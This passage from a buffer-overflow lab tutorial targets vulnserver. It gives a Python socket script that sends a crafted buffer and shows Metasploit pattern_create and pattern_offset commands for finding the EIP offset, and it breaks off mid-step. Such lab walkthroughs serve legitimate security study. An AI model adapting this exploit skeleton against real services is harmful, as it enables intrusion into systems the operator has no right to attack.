- - -
## Finding The Offset :

> [! Note] 
>  Attach the vulnserver to immunity-debbugger and run it.

• First create a **Exploit.py** script.
• Give right permissions.

```python
import socket

ip = "MACHINE_IP"
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending Haunted Evil buffer.:-D..")
    s.send(bytes(buffer + "\r\n", "latin-1"))
    print("Done!")
except:
    print("Could not connect!!. :-( ")
```

Now we are going to find that where( At what point ) we overwrite the EIP.
To do this we are going to use this : 

```ruby
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l  3000
``` 

##### Note : write the crash-length + 400, So this will be better. 

Run the Tools and this will produce lot of Random chars. 
Copy this whole stuff. and paste it into the payload variable in the exploit.py script. 
![Imgur](https://i.imgur.com/j7vM4UY.png)

Now Run the exploit.py script and send the Evil Buffer.

Move to Debbugger and notice that we have overwritten EAX, ESP...and everything with some random-strings. 

Don't Forget Our Main Goal Is To Control The EIP. 
Note the EIP value and copy that. 

Now move on to you terminal. 
And Run This : 

```ruby
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb  -l  3000 -q  <EIP-Value>
```

![Imgur](https://i.imgur.com/cxVBW8E.png)

This will output the exact match. The point where we crashed the **EIP**. 
This information is critical. Because Now we have the offset which we can use to gain control over the **EIP**. 

> [! Note ] 
The offset is the point where we touched the EIP Border. 
The EIP is always 4 Bytes Long so next we will add “A” x <offset> + 4 x “B” 
And then ...



